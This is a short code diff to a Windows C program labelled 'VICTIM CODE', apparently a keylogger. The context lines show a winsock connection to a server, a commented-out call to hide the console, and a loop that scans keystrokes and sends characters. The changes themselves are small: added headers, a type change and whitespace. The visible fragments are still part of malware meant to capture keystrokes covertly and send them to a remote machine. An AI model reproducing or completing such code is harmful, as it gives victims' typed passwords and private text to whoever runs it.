@@ -1,4 +1,6 @@
     //VICTIM CODE
+    #include <stdio.h>
+    #include <conio.h>
     #include <winsock2.h>
     #include <windows.h>
 
@@ -12,7 +14,7 @@
         SOCKADDR_IN serverAddr;
         //DWORD connResult, transferredBytes
         DWORD connectionStatus = 1;
-        UCHAR charToSend;
+        CHAR charToSend;
 
         //HIDE CONSOLE VIEW
         //FreeConsole();
@@ -42,7 +44,7 @@
             WSACleanup();
             return -1;    
         }
-
+        
         while(connectionStatus){
             //Scan character(key) input
             Sleep(10);
